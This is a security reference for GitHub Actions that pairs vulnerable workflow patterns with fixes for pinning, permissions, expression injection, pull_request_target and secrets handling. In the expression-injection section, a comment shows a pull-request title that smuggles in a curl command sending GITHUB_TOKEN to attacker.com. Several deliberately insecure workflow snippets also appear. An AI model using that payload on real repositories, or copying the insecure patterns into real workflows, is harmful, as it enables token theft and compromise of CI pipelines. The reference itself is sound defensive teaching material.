# GitHub Actions Security Reference

Concrete vulnerable and fixed patterns for GitHub Actions workflow reviews.

---

## Action Pinning

```yaml
# CRITICAL — tag can be hijacked by compromising the action repo
- uses: actions/checkout@v4
- uses: docker/build-push-action@v5
- uses: some-org/some-action@main  # Branch reference — worst case

# FIXED — pinned to full commit SHA
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
- uses: docker/build-push-action@4a13e500e55cf31b7a5d59a38ab2040ab0f42f56 # v5.1.0
```

How to get the SHA:
```bash
# Go to the action's releases page, find the tag, click the commit
# Or use gh CLI:
gh api repos/actions/checkout/git/ref/tags/v4.1.1 --jq '.object.sha'
```

Always add a comment with the version tag for readability.

---

## Permissions

```yaml
# HIGH — default permissions are read-write for everything
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps: ...

# FIXED — explicit minimal permissions
name: CI
on: push

permissions: {}  # Default deny at workflow level

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read      # Only what's needed
    steps: ...

  deploy:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write     # Push container images
    steps: ...
```

Common permission scopes and when they're needed:

| Permission | When Needed |
|-----------|-------------|
| `contents: read` | Checkout code (almost always) |
| `contents: write` | Push commits, create releases |
| `packages: write` | Push to GHCR |
| `pull-requests: write` | Comment on PRs, update status |
| `issues: write` | Create/update issues |
| `id-token: write` | OIDC authentication to cloud providers |
| `security-events: write` | Upload SARIF (code scanning results) |
| `actions: read` | Access workflow run info |

---

## Expression Injection

```yaml
# CRITICAL — user-controlled input injected directly into shell
- name: Check PR title
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
    # If PR title contains: "; curl attacker.com/steal?token=$GITHUB_TOKEN"
    # → arbitrary command execution

# CRITICAL — same issue with issue body, commit message, branch name
- run: echo "${{ github.event.issue.body }}"
- run: echo "${{ github.event.head_commit.message }}"
- run: git checkout "${{ github.head_ref }}"

# FIXED — pass through environment variable (shell handles quoting)
- name: Check PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "PR title: ${PR_TITLE}"
```

Dangerous expression contexts (user-controllable):
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.pull_request.head.ref` (branch name)
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.head_commit.message`
- `github.event.head_commit.author.name`
- `github.event.head_commit.author.email`
- `github.event.workflow_dispatch.inputs.*`
- `github.head_ref`

Safe contexts (GitHub-controlled):
- `github.sha`
- `github.run_id`
- `github.actor` (partially — display name can be changed)
- `github.repository`
- `github.event_name`

---

## pull_request_target

```yaml
# CRITICAL — checks out PR code in a privileged context with secrets access
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@SHA
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # PR code!
      - run: npm test  # Executing untrusted PR code with access to secrets

# SAFE PATTERN 1 — pull_request_target without checking out PR code
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - uses: actions/labeler@SHA  # Only labels, doesn't run PR code

# SAFE PATTERN 2 — use pull_request (unprivileged) instead
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@SHA  # Safe — checks out PR code without secrets
      - run: npm test

# SAFE PATTERN 3 — two-workflow approach for untrusted + privileged
# Workflow 1: build artifact (unprivileged)
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@SHA
      - run: npm run build
      - uses: actions/upload-artifact@SHA
        with:
          name: build
          path: dist/

# Workflow 2: deploy artifact (privileged, doesn't run PR code)
on: workflow_run
  workflows: ["Build"]
  types: [completed]
```

---

## Secrets Handling

```yaml
# CRITICAL — secret leaked to logs
- run: echo "Token is ${{ secrets.DEPLOY_TOKEN }}"

# CRITICAL — secret as command argument (visible in process listing)
- run: curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" https://api.example.com

# HIGH — secret in step output (can leak to subsequent steps/jobs)
- id: get_token
  run: echo "token=${{ secrets.MY_TOKEN }}" >> $GITHUB_OUTPUT

# HIGH — debug logging enabled with secrets in env
- run: npm test
  env:
    ACTIONS_STEP_DEBUG: true  # Logs all env vars including secrets
    API_KEY: ${{ secrets.API_KEY }}

# FIXED — secrets via env vars, never in arguments or outputs
- name: Deploy
  env:
    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
  run: |
    # Token passed via env, not command line
    curl -H "Authorization: Bearer ${DEPLOY_TOKEN}" https://api.example.com

# FIXED — for SSH deployment
- name: Deploy via SSH
  env:
    SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
  run: |
    mkdir -p ~/.ssh
    echo "${SSH_PRIVATE_KEY}" > ~/.ssh/id_ed25519
    chmod 600 ~/.ssh/id_ed25519
    ssh-keyscan -H ${{ vars.DEPLOY_HOST }} >> ~/.ssh/known_hosts
    rsync -avz ./dist/ deploy@${{ vars.DEPLOY_HOST }}:/app/
    rm -f ~/.ssh/id_ed25519
```

---

## OIDC Authentication

```yaml
# HIGH — long-lived AWS credentials stored in GitHub Secrets
- name: Configure AWS
  env:
    AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
    AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

# FIXED — OIDC federation, no stored credentials
jobs:
  deploy:
    permissions:
      id-token: write   # Required for OIDC
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@SHA
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-deploy
          aws-region: us-east-1
          # No access keys — uses GitHub's OIDC token
```

---

## Concurrency & Environment Protection

```yaml
# HIGH — parallel deploys can corrupt state
on:
  push:
    branches: [main]
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh

# FIXED — concurrency group prevents parallel deploys
on:
  push:
    branches: [main]

concurrency:
  group: deploy-production
  cancel-in-progress: false  # Don't cancel running deploys!

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production         # Requires environment setup in repo settings
      url: https://myapp.com
    steps:
      - run: ./deploy.sh
```

---

## Timeouts

```yaml
# MEDIUM — no timeout, hung job runs for 6 hours (default)
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm run build

# FIXED — explicit timeout
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - run: npm run build
```

---

## Conditional Execution & Path Filters

```yaml
# MEDIUM — every push triggers full CI even for docs changes
on:
  push:
    branches: [main]

# FIXED — path filters skip irrelevant runs
on:
  push:
    branches: [main]
    paths-ignore:
      - '*.md'
      - 'docs/**'
      - '.gitignore'
      - 'LICENSE'
```

---

## Reusable Workflows (DRY)

```yaml
# MEDIUM — same deploy steps copied across multiple workflows

# FIXED — reusable workflow
# .github/workflows/deploy-reusable.yml
name: Deploy
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
      image_tag:
        required: true
        type: string
    secrets:
      SSH_KEY:
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - name: Deploy
        env:
          SSH_KEY: ${{ secrets.SSH_KEY }}
        run: ./deploy.sh ${{ inputs.environment }} ${{ inputs.image_tag }}

# Caller workflow
# .github/workflows/deploy-prod.yml
jobs:
  deploy:
    uses: ./.github/workflows/deploy-reusable.yml
    with:
      environment: production
      image_tag: ${{ github.sha }}
    secrets:
      SSH_KEY: ${{ secrets.PROD_SSH_KEY }}
```

---

## Self-Hosted Runner Security

```yaml
# CRITICAL — persistent self-hosted runner accumulates state
runs-on: self-hosted  # Same runner used across jobs, repos
# Previous job's files, credentials, processes may persist

# FIXED — ephemeral runners (one job per VM instance)
runs-on: self-hosted
# Runner configured with --ephemeral flag
# VM destroyed after each job

# Alternative: use container isolation on self-hosted
runs-on: self-hosted
container:
  image: node:22-slim
  # Job runs inside disposable container
```

Checklist for self-hosted runners:
- [ ] Runner uses `--ephemeral` flag
- [ ] Runner is not shared across repos with different trust levels
- [ ] No long-lived credentials on the runner
- [ ] Runner workspace is cleaned between jobs
- [ ] Runner is in an isolated network (not on the VPS itself)
- [ ] Runner processes are monitored

---

## Complete Secure Workflow Template

```yaml
name: Build and Deploy

on:
  push:
    branches: [main]
    paths-ignore:
      - '*.md'
      - 'docs/**'

permissions: {}

concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: false

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
      - uses: actions/setup-node@b39b52d1213e96004bfcb1c61a8a6fa8ab84f3e8 # v4.0.1
        with:
          node-version: 22
          cache: 'npm'
      - run: npm ci
      - run: npm run lint

  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: actions/setup-node@b39b52d1213e96004bfcb1c61a8a6fa8ab84f3e8
        with:
          node-version: 22
          cache: 'npm'
      - run: npm ci
      - run: npm test

  build:
    needs: [lint, test]
    runs-on: ubuntu-latest
    timeout-minutes: 20
    permissions:
      contents: read
      packages: write
    outputs:
      image_digest: ${{ steps.build.outputs.digest }}
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: docker/setup-buildx-action@f95db51fddba0c2d1ec667646a06c2ce06100226
      - uses: docker/login-action@343f7c4344506bcbf9b4de18042ae17996df046d
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: build
        uses: docker/build-push-action@4a13e500e55cf31b7a5d59a38ab2040ab0f42f56
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy:
    needs: [build]
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    environment:
      name: production
      url: https://myapp.com
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy to VPS
        env:
          SSH_PRIVATE_KEY: ${{ secrets.DEPLOY_SSH_KEY }}
          DEPLOY_HOST: ${{ vars.DEPLOY_HOST }}
          DEPLOY_USER: ${{ vars.DEPLOY_USER }}
          IMAGE_TAG: ${{ github.sha }}
        run: |
          mkdir -p ~/.ssh
          echo "${SSH_PRIVATE_KEY}" > ~/.ssh/id_ed25519
          chmod 600 ~/.ssh/id_ed25519
          ssh-keyscan -H "${DEPLOY_HOST}" >> ~/.ssh/known_hosts

          ssh "${DEPLOY_USER}@${DEPLOY_HOST}" << 'ENDSSH'
            cd /opt/app
            export IMAGE_TAG="${IMAGE_TAG}"
            docker compose pull
            docker compose up -d --remove-orphans
            docker image prune -f
          ENDSSH

          rm -f ~/.ssh/id_ed25519
```
